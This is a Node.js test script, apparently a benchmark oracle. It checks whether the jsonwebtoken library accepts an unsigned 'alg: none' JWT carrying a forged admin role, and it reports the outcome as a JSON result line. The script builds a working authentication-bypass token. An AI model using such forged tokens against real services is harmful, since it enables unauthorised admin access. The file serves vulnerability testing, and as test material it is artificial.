const path = require('node:path');
const fs = require('node:fs');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function b64url(input) {
  return Buffer.from(input).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function printResult() {
  const result = {
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  };
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

try {
  const jwt = require('jsonwebtoken');

  const tmpMarkerDir = path.join('/tmp', 'oracle-jsonwebtoken-alg-none-marker');
  try {
    if (!fs.existsSync(tmpMarkerDir)) fs.mkdirSync(tmpMarkerDir, { recursive: true });
  } catch (_) {}

  const benignPayload = { role: 'user', iat: 1700000000 };
  const secret = 'trusted-secret-for-benign-check';

  // Benign operation: normal HS256 sign+verify should work.
  const goodToken = jwt.sign(benignPayload, secret, { algorithm: 'HS256' });
  const goodVerified = jwt.verify(goodToken, secret);
  if (!goodVerified || goodVerified.role !== 'user') {
    throw new Error('benign verify did not return expected payload');
  }

  operation_completed = true;

  // Malicious token: alg=none unsigned token with attacker-controlled payload.
  const header = { alg: 'none', typ: 'JWT' };
  const payload = { role: 'admin', attack: 'alg-none-bypass', iat: 1700000000 };
  const maliciousToken = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(payload)) + '.';

  try {
    // In vulnerable behavior this may be accepted when algorithm constraints are insecure/defaulted.
    const decoded = jwt.verify(maliciousToken, secret);
    if (decoded && decoded.role === 'admin') {
      exploit_succeeded = true;
      evidence = 'Unsigned alg=none token accepted and returned admin payload';
    } else {
      exploit_succeeded = false;
      evidence = 'Malicious token returned unexpected payload shape';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'Malicious token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

printResult();
